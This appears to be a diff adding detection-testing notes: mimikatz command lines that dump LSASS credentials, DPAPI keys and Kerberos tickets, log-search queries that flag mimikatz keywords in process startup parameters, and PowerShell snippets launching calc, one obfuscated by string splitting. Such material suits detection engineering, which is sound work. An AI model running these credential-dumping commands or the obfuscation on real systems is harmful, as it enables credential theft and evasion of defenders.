@@ -1,0 +1,16 @@
+mimikatz.exe "log minidump.log" version privilege::debug "sekurlsa::minidump lsass.dmp" exit
+mimikatz.exe "log logonpasswords.log" version privilege::debug sekurlsa::logonpasswords exit
+mimikatz.exe "log dpapi.log" version privilege::debug "sekurlsa::dpapi" exit
+mimikatz.exe "log tickets.log" version privilege::debug "sekurlsa::tickets /export" exit
+mimikatz.exe "log rpc.log" version privilege::debug rpc::server rpc::enum rpc::close exit
+
+StartupParameters:(*mimikatz* *mimilib* *DumpCerts* *DumpCreds* *invoke-mimikatz*) OR (StartupParameters:(*kerberos* *sekurlsa* *lsadump* *dpapi* *logonpasswords* *privilege* "*rpc\:\:server*" "*service\:\:me*" *token* *vault*) AND StartupParameters.raw:*\:\:* ) 
+
+StartupParameters:(*mimikatz* *mimilib* *DumpCerts* *DumpCreds* *invoke-mimikatz*) OR (StartupParameters:(*kerberos* *sekurlsa* *lsadump* *dpapi* *logonpasswords* *privilege* *token* *vault* *rpc%3A%3Aserver* *service%3A%3Ame*) AND StartupParameters:*%3A%3A*) 
+
+Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Would  you like to play a game?','Game input','YesNoCancel','Error'); [string] $cmd = 'calc'; Write-Verbose -Message $cmd; Invoke-Command -ScriptBlock ([ScriptBlock]::Create($cmd))
+
+
+Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show(('W'+("{0}{2}{1}"-f'oul',' y','d ')+'o'+'u '+("{2}{0}{1}"-f 'o',' pl','like t')+("{2}{1}{0}" -f '?','a game','ay ')),('Gam'+("{1}{0}"-f'n','e i')+'put'),(("{0}{1}"-f 'Ye','sN')+("{0}{1}" -f'oCan','c')+'el'),(("{1}{0}" -f 'o','Err')+'r'))
+
+Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show(('W'+'ould  y'+'o'+'u '+'like to pl'+'ay a game?'),('Gam'+'e in'+'put'),('YesN'+'oCanc'+'el'),('Erro'+'r'))
